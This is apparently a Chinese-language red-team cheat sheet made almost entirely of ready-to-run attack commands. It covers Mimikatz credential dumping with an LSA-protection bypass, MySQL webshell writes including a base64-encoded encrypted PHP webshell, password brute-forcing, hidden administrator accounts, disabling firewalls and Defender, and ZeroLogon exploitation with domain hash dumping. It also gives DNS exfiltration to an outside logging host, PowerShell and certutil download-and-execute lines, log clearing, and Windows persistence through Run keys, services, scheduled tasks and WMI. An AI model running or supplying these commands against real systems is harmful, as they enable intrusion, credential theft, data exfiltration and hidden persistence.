端口列表12345622,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,489921-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,5006020-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389 字典 toppassword1234567891234567812345qwerty123123111111abc1231234567dragon1q2w3e4rsunshine654321master1234football1234567890000000computer666666supermanmichaelinternetiloveyoudaniel1qaz2wsxmonkeyshadowjessicaletmeinbaseballwhateverprincessabcd1234123321starwars121212thomaszxcvbnmtrustno1killerwelcomejordanaaaaaa123qwefreedompassword1charliebatmanjennifer7777777michellediamondolivermercedesbenjamin11111111snoopysamanthavictoriamatrixgeorgealexandersecretcookieasdfgh987654321123abcorangefuckyouasdf1234pepperhuntersilverjoshuabanana1q2w3echelsea1234qwersummerqwertyuiopphoenixandrewq1w2e3r4elephantrainbowmustangmerlinlondongarfieldrobertchocolate112233samsungqazwsxmatthewbusterjonathangingerflower555555testcarolineamandamaverickmidnightmartinjunior88888888anthonyjasminecreativepatrickmickey123qwerty123cocacolachickenpassw0rdforeverwilliamnicolehelloyellownirvanajustinfriendscheesetiggermotherliverpoolblink182asdfghjklandreaspiderscooterrichardsoccerrachelpurplemorganmelissajacksonarsenal222222qwe123gabrielferrarijasperdaniellebanditangelascorpionprincemaggieaustinveronicanicholasmonsterdextercarlosthundersuccesshannahashley131313stellabrandonpokemonjosephasdfasdf999999metallicadecemberchestertaylorsophiesamuelrabbitcrystalbarneyxxxxxxstevenrangerpatriciachristianassholespidermansandrahockeyangelssecurityparkerheather888888victorharley333333systemslipknotnovemberjordan23canadatennisqwertyuicasper Mimikatz一条命令 1.\\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit 控制台执行多条命令，用log防止进程崩溃，数据丢失 1234mimikatz # privilege::debugmimikatz # logmimikatz # sekurlsa::logonpasswordsmimikatz # sekurlsa::wdigest msf中执行命令 12mimikatz_command -f sekurlsa::logonPasswords fullmimikatz_command -f sekurlsa::wdigest 注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1 bypass lsa Protection(ppl)查询是否启用 12reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa 把mimidriver.sys拷贝到同级目录，进行加载bypass 1234567mimikatz # !+mimikatz # !processprotect /process:lsass.exe /removemimikatz # privilege::debug mimikatz # token::elevatemimikatz # sekurlsa::logonpasswordsmimikatz # !processprotect /process:lsass.exemimikatz # !- cs凭证解析提取用户名 1awk -F&quot;:::&quot; &#x27;&#123;print $1&#125;&#x27; credentials.txt | awk -F&quot;\\\\&quot; &#x27;&#123;print $2&#125;&#x27; 提取hash 1awk -F&quot;:::&quot; &#x27;&#123;print $2&#125;&#x27; credentials.txt 存活主机1for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=” bypassDefender排除项 12powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\\test&quot; gobuster1gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt dirsearch1python3 dirsearch.py -e php,html,js -u https://target 1python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist 1python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20 1python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080 1python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080 nbtscan1nbtscan.exe 10.11.1.0/24 代理工具proxychainsockscap64proxifier https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-tihttps://www.mediafire.com/folder/32rj1769a2w82/v4.7 内网穿透工具fuso https://github.com/editso/fuso.git 相对冷门，不会被杀在9004上开启socks5代理 1fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004 frpnpsioxStowawayhttps://github.com/lz520520/Stowaway Venomhttps://github.com/Dliv3/Venom ssh无记录shell 1ssh -T root@192.168.1.1 /usr/bin/bash -i grep1grep -E &quot;([0-9]&#123;1,3&#125;[\\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; -r xxx --color=auto 1grep -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto 1grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/ 1grep -ohr -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; /app/ |sort|uniq &gt;&gt; test.txt mysql开远程 12345use mysql; update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; FLUSH PRIVILEGES ; select host, user from user; mysql -uroot -p -e &quot;select * from mysql.user;&quot; &gt;1.txt 不登录直接执行sql 12mysql -uaHmin -proot test -e &quot;select now()&quot; -N &gt;H:/work/target1.txtmysql -uroot -e &quot;show databases;&quot; &gt;1.txt mysql getshell 123show variables like &#x27;%secure%&#x27; select &#x27;&lt;?php eval($_POST[xxx]) ?&gt;&#x27; into outfile &#x27;/var/www/xx.php&#x27;; select &#x27;&lt;?php eval($_POST[xx]) ?&gt;&#x27; into dumpfile &#x27;/var/www/xx.php&#x27;; 123set global general_log=on; set global general_log_file=&#x27;/var/www/1.php&#x27;; select &#x27;&lt;?php eval($_POST[s6]) ?&gt;&#x27;; 12select &#x27;&lt;?php file_put_contents(&quot;abab.php&quot;,base64_decode(&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;));?&gt;&#x27; into outfile &#x27;C:/wamp/www/abb.php&#x27;; sqlmap1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --proxy &quot;http://127.0.0.1:1080&quot; 1python sqlmap.py -u &quot;http://www.vuln.cn&quot; –cookie &quot;id=11&quot; --level 2 1python sqlmap.py -u &quot;www.xxxx.com/product/detail/id/3*.html&quot; --dbms=mysql -v 3 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql --dbs 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test --tables 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test -T admin –-columns 1python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --dbms mysql -D test -T admin -C &quot;username,password&quot; --dump 1python sqlmap.py -r &quot;c:\\request.txt&quot; -p id –dbms mysql –file-read=&quot;e:\\www\\as\\config.php&quot; 找可写目录1234567891011121314151617181920212223242526### linux#### 在/root war文件的同目录下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$(dirname $file)/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $(dirname $file)/finddir.txt&quot;;done#### 在/root war文件夹下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $file/finddir.txt&quot;;done### windows#### 在C:\\Users\\liulangmao\\Desktop任意子目录 war.txt文件的同目录下写for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war.txt&#x27;) do (echo %i &gt; %i\\..\\finddir.txt)删for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war.txt&#x27;) do (del %i\\..\\finddir.txt)#### 在C:\\Users\\liulangmao\\Desktop任意子目录 war文件夹下写for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war&#x27;) do (echo %i &gt; %i\\finddir.txt)删for /f %i in (&#x27;dir /s /b C:\\Users\\liulangmao\\Desktop\\war&#x27;) do (del %i\\finddir.txt) 示例：在weblogic靶机&#x2F;root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。 12find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done 程序名找启动路径 1wmic process where name=&#x27;mysqld.exe&#x27; get processid,executablepath,name 启动路径找login.jsp 1for /f %i in (&#x27;dir /s /b D:\\UFGOV\\U8\\login.jsp&#x27;) do (echo %i) base64分段不换行追加写文件 1echo|set /p=\\&quot;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\\&quot; &gt; D:\\UFGOV\\U8\\webapps\\demonstrate.txt 解决cmd无回显问题 1powershell Get-ChildItem C: hydra1234567891011121314参数：-l 指定的用户名 -L 用户名字典-p 指定密码 -P 密码字典-s 指定端口 -o 输出文件-t 任务数默认16-f 爆破成功一个就停止-v 报错日志详细 -V 攻击日志&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10 medusa1234567参数：-h 目标名或IP -H 目标列表-u 用户名 -U 用户名字典-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程-n 指定端口 -e ns 尝试空密码和用户名密码相同&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql python交互shell1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 1python2 -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27; 无交互添加用户1useradd newuser;echo &quot;newuser:password&quot;|chpasswd 1useradd -p `openssl passwd 123456` guest 1useradd -p &quot;$(openssl passwd 123456)&quot; guest 1useradd newuwer;echo -e &quot;123456\\n123456\\n&quot; |passwd newuser windows123456789net user admin$ Afabab@20 /addnet localgroup administrators admin$ /addnet user guest /active:yesnet localgroup administrators guest /addNet localgroup Administrators kent /add /domain 将域用户添加到域管理员组Net localgroup Administrators /add test\\kent 将域用户添加到本地管理员组 防火墙123456789101112131415161718192021222324252627282930313233343536关闭防火墙netsh firewall set opmode mode=disable放行远程8888端口进来的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=in remoteport=8888 action=allow放行出去到远程8888端口的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=out remoteport=8888 action=allow放行本地4444端口出去的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=out localport=4444 action=allow放行从本地4444端口进来的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=in localport=4444 action=allow删除规则netsh advfirewall firewall delete rule name=&quot;88&quot;查看防火墙配置(可看到具体规则等配置)netsh firewall show config关闭windefebdnet stop windefendnetsh firewall set portopening TCP 445 ENABLE //打开445端口 netsh firewall set portopening TCP 3389 ENABLE //开放终端 netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行 netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行 新版本命令 netsh advfirewall firewall add rule name=&quot;test&quot; dir=in action=allow program=&quot;C:\\windows\\temp\\update.exe&quot; enable=yes netsh advfirewall firewall add rule name=&quot;test&quot; dir=out action=allow program=&quot;C:\\windows\\temp\\update.exe&quot; enable=yes frp常用配置frpc.ini 12345678910111213141516171819[common]server_addr = xxxxxxserver_port = 7000[rdp]type = tcplocal_port = 3389remote_port = 3389[plugin_http_proxy]type = tcpremote_port = 10801plugin = http_proxy[plugin_socks5]type = tcpremote_port = 1080plugin = socks5 ZeroLogon 产生日志 4742(利用成功), 5580(利用失败) 流量特征明显 会被av直接秒 有可能会导致目标脱域 代理不稳，容易出问题 123456git clone https://github.com/mstxq17/cve-2020-1472.gitpython3 zerologon_tester.py Dc02 172.23.119.120 域外检测PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测 洞清空目标域控机器账户密码 12python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120 无密码远程提取 ntds.dit 1python3 secretsdump.py qq.local/&#x27;Dc02$&#x27;@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash 用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式] 1python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120 用上面的 hex 还原目标域控机器账户密码 12python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131*** 删rdp日志清除远程桌面连接记录,创建clear.bat 123456@echo offreg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /freg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /freg add &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;cd %userprofile%\\documents\\attrib Default.rdp -s -hdel Default.rdp 开338912345系统windows server 2003后wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fnet start TermService 文件搜索https://www.anquanke.com/post/id/245019 1findstr /s /i /n /d:C:\\ /c:&quot;123123&quot; *.txt 1for /r C: %i in (login.*) do @echo %i 1where /R C: login.* 1dir /s/a-d/b login.* 1find / -name index.php 1find / -name index.php 1find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot; 1updatedb &amp;&amp; locate index.php 12进程路径wmic process get name,executablepath 外带oobWindows在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。 1echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io 下面这个语句，主要是过滤作用。把helo.txt文件中的“&#x3D;”过滤并重新输出文件。 1for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt) 为什么在上面需要过滤&#x3D;，主要是因为在执行ping命令的时候是不允许带&#x3D;号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。 1echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io 如果需要外带多行命令，则需要以下语句： 12where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#x27; &#x27;,&#x27;&#x27;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#x27;.&#x27;+$i+&#x27;.is1lv6.ceye.io&#x27;;$j += 1; nslookup $fin &#125;（b）Linux 在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。 1ping pwd|tr -d &#x27;\\n&#x27;|xxd -ps.is1lv6.ceye.io base64原理和上面类似，主要是对值进行base64编码，然后替换掉“&#x3D;”，即可成功外带数据。 1pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io 如果有多行数据需要外带，那么请考虑下面的语句。 1var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done powershell文件下载1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.1.1/1.exe&#x27;,&#x27;C:\\test\\1.exe&#x27;);start-process &#x27;C:\\test\\1.exe&#x27; 1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.1.1/1.exe&#x27;,&#x27;1.exe&#x27;) 1Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://xxx.xx.xx.xx/test.ps1&quot;) bypass 1echo (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.31.93:8000/tomcat.exe&#x27;,&#x27;C:/Users/test/cc.exe&#x27;)| powershell - certutil.exe下载1certutil.exe -urlcache -split -f http://192.168.1.1/1.exe 1certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe 1certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\\windows\\temp\\up.exe &amp;&amp;start C:\\windows\\temp\\up.exe 删除缓存 1certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete 查看缓存项目： 1certutil.exe -urlcache * 转为base64 1certutil -encode lcx64.exe lcx64.txt 转回来 1certutil -decode lcx64.txt lcx64.exe 查看md5 1certutil -hashfile a.exe MD5 bypass 12Certutil &amp; Certutil –urlcache –f –split urlCertutil | Certutil –urlcache –f –split url bitsadmin不支持https、ftp协议，php python带的服务器会出错 1bitsadmin /transfer n http://192.168.1.1/1.exe C:\\test\\update\\1.exe windows权限维持Startup目录12345678910111213NT6以后的目录如下：对当前用户有效：C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup对所有用户有效：C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUpNT6以前的目录如下：对当前用户有效：C:\\Documents and Settings\\Hunter\\「开始」菜单\\程序\\启动对所有用户有效：C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 注册键12reg add &quot;XXXX&quot; /v evil /t REG_SZ /d &quot;[Absolute Path]\\evil.exe&quot; 12345678910111213141516171819202122232425262728293031323334353637381.Load注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load2.Userinit注册键HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。3.Explorer＼Run注册键Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunExplorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。4.RunServicesOnce注册键RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnceHKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce5.RunServices注册键RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServicesHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices6.RunOnce＼Setup注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼SetupHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup7.RunOnce注册键安装程序通常用RunOnce键自动运行程序，它的位置在HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceExHKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceHKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。8.Run注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunRun是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。 服务1sc create evil binpath= &quot;cmd.exe /k [Absolute Path]evil.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot; 计划任务1SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \\Microsoft\\Windows\\evil\\eviltask /TR C:\\Users\\hunter\\Desktop\\evil.exe WMI事件123456wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;,CommandLineTemplate=&quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;evil\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;evilConsumer\\&quot;&quot; 屏幕保护1234reg add &quot;hkcu\\control panel\\desktop&quot; /v SCRNSAVE.EXE /d C:\\Users\\hunter\\Desktop\\beacon.exe /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaveActive /d 1 /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaverIsSecure /d 0 /freg add &quot;hkcu\\control panel\\desktop&quot; /v ScreenSaveTimeOut /d 60 /f bitsadmin1234bitsadmin /create evilbitsadmin /addfile evil &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot; &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot;bitsadmin.exe /SetNotifyCmdLine evil &quot;C:\\Users\\hunter\\Desktop\\beacon.exe&quot; NULbitsadmin /Resume evil Netsh白加黑12345可以通过导入helperdll的方式做权限维持，命令格式如下：netsh add helper [Absolute evil DLL path]但是由于netsh并不会开启自启动，因此还要再写一条自启动项：reg add &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\\Windows\\System32\\netsh&quot;重新启动后依然可获得shell： 